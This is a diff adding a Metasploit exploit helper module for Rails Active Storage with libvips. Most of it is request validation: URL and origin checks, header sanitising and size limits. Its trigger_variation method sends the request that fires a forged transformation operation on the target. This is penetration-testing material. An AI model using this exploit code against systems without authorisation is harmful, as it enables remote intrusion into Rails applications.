+++ lib/msf/core/exploit/remote/http/rails_active_storage_vips/request.rb
@@ -1,0 +1,257 @@
+# frozen_string_literal: true
+
+require 'openssl'
+require 'timeout'
+require 'uri'
+require 'msf/core/exploit/remote/http/rails_active_storage_vips/png_decoder'
+
+module Msf::Exploit::Remote::HTTP::RailsActiveStorageVips
+  # HTTP request isolation and validation for target-controlled Active Storage URLs.
+  module Request
+    MAX_UPLOAD_HEADERS = 64
+    MAX_UPLOAD_HEADER_BYTES = 65_536
+    MAX_UPLOAD_HEADER_VALUE_BYTES = 8192
+    UNSAFE_UPLOAD_HEADERS = %w[
+      authorization connection content-length cookie expect host keep-alive proxy-authenticate
+      proxy-authorization proxy-connection te trailer transfer-encoding upgrade
+    ].freeze
+
+    private
+
+    def target_request(method, uri, options = {})
+      cookie = [datastore['COOKIE'], cookie_jar.cookies.join('; ')].compact.reject(&:blank?).join('; ')
+      request = {
+        'method' => method,
+        'uri' => uri,
+        'keep_cookies' => true
+      }.merge(options)
+      request['cookie'] = cookie if cookie.present?
+      request
+    end
+
+    def send_request_to_url(url, method:, data:, headers:)
+      parsed = URI.parse(url)
+      validate_http_url!(parsed, 'Direct upload URL')
+      same_target = same_target_url?(parsed)
+      validate_external_storage_url!(parsed, 'Direct upload URL') unless same_target
+
+      uri = parsed.path.presence || '/'
+      uri += "?#{parsed.query}" if parsed.query
+      request_headers = sanitize_upload_headers(headers).merge('Connection' => 'close')
+
+      if same_target
+        return send_request_cgi(
+          target_request(
+            method,
+            uri,
+            'data' => data,
+            'headers' => request_headers
+          )
+        )
+      end
+
+      send_sanitized_request(
+        'method' => method,
+        'uri' => uri,
+        'data' => data,
+        'headers' => request_headers,
+        'cookie' => '',
+        'rhost' => parsed.hostname,
+        'rport' => parsed.port,
+        'SSL' => parsed.scheme == 'https',
+        'vhost' => parsed.hostname
+      )
+    rescue URI::Error => e
+      raise FlowError, "Direct upload URL was invalid: #{e.message}"
+    end
+
+    def request_representation(path)
+      current = URI.parse(path)
+      if current.hostname
+        request_uri(current.to_s)
+      else
+        current = URI.parse(full_uri(request_uri(current.to_s)))
+      end
+      isolated_chain = !same_target_url?(current)
+
+      (REPRESENTATION_REDIRECT_LIMIT + 1).times do |redirect_index|
+        validate_http_url!(current, 'Representation URL')
+        same_target = same_target_url?(current)
+        validate_external_storage_url!(current, 'Representation URL') unless same_target
+        uri = current.path.presence || '/'
+        uri += "?#{current.query}" if current.query
+        res = if !isolated_chain && same_target
+                send_request_cgi(target_request('GET', uri))
+              else
+                send_sanitized_request(
+                  'method' => 'GET',
+                  'uri' => uri,
+                  'headers' => { 'Accept' => 'image/png', 'Connection' => 'close' },
+                  'rhost' => current.hostname,
+                  'rport' => current.port,
+                  'SSL' => current.scheme == 'https',
+                  'vhost' => current.hostname
+                )
+              end
+        validate_representation_response_size!(res)
+        return res unless res&.redirect? && res.redirection
+        raise FlowError, 'Representation response exceeded the redirect limit' if redirect_index == REPRESENTATION_REDIRECT_LIMIT
+
+        current = URI.join(current.to_s, res.redirection.to_s)
+        # Once a redirect leaves the application origin, keep the rest of the chain isolated.
+        isolated_chain ||= !same_target_url?(current)
+      end
+    rescue URI::Error => e
+      raise FlowError, "Representation redirect was invalid: #{e.message}"
+    end
+
+    def send_sanitized_request(options)
+      logger = Rex::Proto::Http::HttpLoggerSubscriber.new(logger: self)
+      client = Rex::Proto::Http::Client.new(
+        options['rhost'],
+        options['rport'],
+        { 'Msf' => framework, 'MsfExploit' => self },
+        options['SSL'],
+        ssl_version,
+        proxies,
+        '',
+        '',
+        kerberos_authenticator: nil,
+        subscriber: logger,
+        sslkeylogfile: sslkeylogfile
+      )
+      client.set_config(
+        'vhost' => options['vhost'],
+        'ssl_server_name_indication' => options['vhost'],
+        'agent' => datastore['UserAgent'],
+        'raw_headers' => ''
+      )
+      request = client.request_cgi(
+        options.merge(
+          'cookie' => nil,
+          'raw_headers' => '',
+          'authorization' => nil,
+          'username' => '',
+          'password' => '',
+          'preferred_auth' => 'None',
+          kerberos_authenticator: false
+        )
+      )
+      client._send_recv(request, sanitized_request_timeout)
+    rescue ::EOFError, ::Errno::EPIPE, ::Errno::ETIMEDOUT, ::OpenSSL::SSL::SSLError, ::Timeout::Error, Rex::ConnectionError => e
+      vprint_error("External request failed: #{e}")
+      nil
+    ensure
+      client&.close
+    end
+
+    def validate_http_url!(parsed, label)
+      unless %w[http https].include?(parsed.scheme) && parsed.hostname
+        raise FlowError, "#{label} was not an HTTP(S) URL"
+      end
+      raise FlowError, "#{label} contained credentials" if parsed.user || parsed.password
+      raise FlowError, "#{label} contained a fragment" if parsed.fragment
+    end
+
+    def validate_external_storage_url!(parsed, label)
+      return if external_storage_origins.include?(parsed.origin.downcase)
+
+      raise ConfigError, "#{label} used untrusted external origin #{parsed.origin}; add that exact origin to ExternalStorageOrigins only if it is an expected storage service"
+    end
+
+    def external_storage_origins
+      datastore['ExternalStorageOrigins'].to_s.split(',').filter_map do |origin|
+        origin = origin.strip
+        next if origin.empty?
+
+        parsed = URI.parse(origin)
+        unless %w[http https].include?(parsed.scheme) && parsed.hostname && parsed.user.nil? && parsed.password.nil? && parsed.query.nil? && parsed.fragment.nil? && ['', '/'].include?(parsed.path)
+          raise ConfigError, "ExternalStorageOrigins contained an invalid origin: #{origin}"
+        end
+
+        parsed.origin.downcase
+      rescue URI::Error => e
+        raise ConfigError, "ExternalStorageOrigins contained an invalid origin #{origin.inspect}: #{e.message}"
+      end.uniq
+    end
+
+    def sanitize_upload_headers(headers)
+      raise FlowError, 'Direct upload headers were not a JSON object' unless headers.is_a?(Hash)
+      raise FlowError, "Direct upload response contained more than #{MAX_UPLOAD_HEADERS} headers" if headers.length > MAX_UPLOAD_HEADERS
+
+      total_bytes = 0
+      seen_names = {}
+      headers.each_with_object({}) do |(name, value), sanitized|
+        unless name.is_a?(String) && name.match?(/\A[!#$%&'*+\-.^_`|~0-9A-Za-z]+\z/)
+          raise FlowError, 'Direct upload response contained an invalid header name'
+        end
+
+        normalized_name = name.downcase
+        raise FlowError, "Direct upload response contained duplicate #{name} headers" if seen_names[normalized_name]
+        raise FlowError, "Direct upload response contained unsafe #{name} header" if UNSAFE_UPLOAD_HEADERS.include?(normalized_name)
+
+        seen_names[normalized_name] = true
+        next if value.nil?
+
+        raise FlowError, "Direct upload header #{name} was not a string" unless value.is_a?(String)
+        raise FlowError, "Direct upload header #{name} exceeded #{MAX_UPLOAD_HEADER_VALUE_BYTES} bytes" if value.bytesize > MAX_UPLOAD_HEADER_VALUE_BYTES
+        if value.b.match?(/[\x00-\x08\x0a-\x1f\x7f]/n)
+          raise FlowError, "Direct upload header #{name} contained a control character"
+        end
+
+        total_bytes += name.bytesize + value.bytesize
+        raise FlowError, "Direct upload headers exceeded #{MAX_UPLOAD_HEADER_BYTES} bytes" if total_bytes > MAX_UPLOAD_HEADER_BYTES
+
+        sanitized[name] = value
+      end
+    end
+
+    def validate_representation_response_size!(res)
+      return unless res
+      return if res.body.to_s.bytesize <= PngDecoder::MAX_DATA_BYTES
+
+      raise FlowError, "Representation response exceeded #{PngDecoder::MAX_DATA_BYTES} bytes"
+    end
+
+    def sanitized_request_timeout
+      configured_timeout = datastore['HttpClientTimeout']
+      configured_timeout&.positive? ? configured_timeout : 20
+    end
+
+    def same_target_url?(parsed)
+      return false unless parsed.hostname
+
+      target_hosts = [rhost, vhost].compact.reject(&:blank?).map(&:downcase)
+      target_hosts.include?(parsed.hostname.downcase) && parsed.port == rport && (parsed.scheme == 'https') == ssl
+    end
+
+    def request_uri(path_or_url)
+      parsed = URI.parse(path_or_url)
+      if parsed.hostname && !same_target_url?(parsed)
+        raise FlowError, "Application returned a representation URL on a different origin: #{parsed}"
+      end
+
+      uri = parsed.path.presence || '/'
+      uri += "?#{parsed.query}" if parsed.query
+      uri
+    rescue URI::Error => e
+      raise FlowError, "Application returned an invalid URL: #{e.message}"
+    end
+
+    def trigger_variation(path)
+      # The forged operation executes while Rails builds the transformation
+      # pipeline and normally ends in an HTTP 500 or a payload-held connection.
+      res = send_request_cgi(target_request('GET', request_uri(path)), 10)
+      unless res
+        vprint_status('No HTTP response while triggering the forged variation')
+        return
+      end
+
+      if res.code.between?(300, 499)
+        raise TriggerError, "Forged variation was rejected with HTTP #{res.code}"
+      end
+
+      vprint_status("Forged variation returned HTTP #{res.code}")
+    end
+  end
+end
